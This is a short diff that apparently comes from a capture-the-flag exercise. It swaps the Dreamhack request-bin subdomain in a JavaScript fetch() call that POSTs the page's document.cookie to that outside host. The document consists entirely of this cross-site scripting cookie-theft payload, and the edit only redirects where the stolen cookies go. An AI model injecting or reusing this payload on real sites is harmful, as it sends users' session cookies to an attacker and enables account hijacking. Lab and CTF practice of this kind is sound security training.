@@ -1,4 +1,4 @@
-a = await fetch("https://iwtekfx.request.dreamhack.games", {
+a = await fetch("https://rjolnxz.request.dreamhack.games", {
     method: "POST",
     body: document.cookie
 })
